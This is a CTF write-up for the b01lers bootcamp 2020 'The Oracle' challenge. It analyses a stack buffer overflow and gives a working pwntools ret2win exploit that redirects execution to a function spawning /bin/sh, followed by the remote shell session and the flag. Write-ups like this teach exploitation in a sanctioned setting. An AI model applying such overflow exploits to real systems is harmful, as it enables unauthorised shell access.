# b01lers bootcamp CTF 2020

## The Oracle

> 100
>
> Would you still have broken it if I hadn't said anything?
>
> `nc chal.ctf.b01lers.com 1015`
> 
> [theoracle](theoracle)  
> [theoracle.c](theoracle.c)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _ret2win_


## Summary

Basic _ret2win_.
 

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Anything goes but shellcode.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  char local_18 [16];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("Know Thyself.");
  fgets(local_18,0x80,stdin);
  return 0;
}

void win(void)
{
  char *local_18;
  char *local_10;
  
  local_10 = (char *)0x0;
  local_18 = (char *)0x0;
  execve("/bin/sh",&local_10,&local_18);
  return;
}
```

> Yes the source is included, but only Ghidra tells me I need to write `0x18` (`local_18`) bytes to get to the return address.

So, `fgets` will _get_ up to `0x80` bytes for a buffer that is `0x18` bytes from the return address on the stack.  With no PIE, setting up a _win_ is easy.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./theoracle')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    p = remote('chal.ctf.b01lers.com', 1015)

payload  = 0x18 * b'A'
payload += p64(binary.sym.win)

p.sendlineafter('Know Thyself.\n',payload)
p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/b01lersbootcampctf2020/the_oracle/theoracle'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.ctf.b01lers.com on port 1015: Done
[*] Switching to interactive mode
$ id
uid=1000(theoracle) gid=1000(theoracle) groups=1000(theoracle)
$ ls -l
total 36
-r-xr-x--- 1 root theoracle    86 Oct  2 18:33 Makefile
-r--r----- 1 root theoracle    45 Oct  2 18:33 flag.txt
-r-xr-x--- 1 root theoracle 16936 Oct  3 04:09 theoracle
-r-xr-x--- 1 root theoracle   330 Oct  2 18:33 theoracle.c
-r-xr-x--- 1 root theoracle    47 Oct  2 18:33 wrapper.sh
$ cat flag.txt
flag{Be1ng_th3_1_is_JusT_l1ke_b3ing_in_l0v3}
```
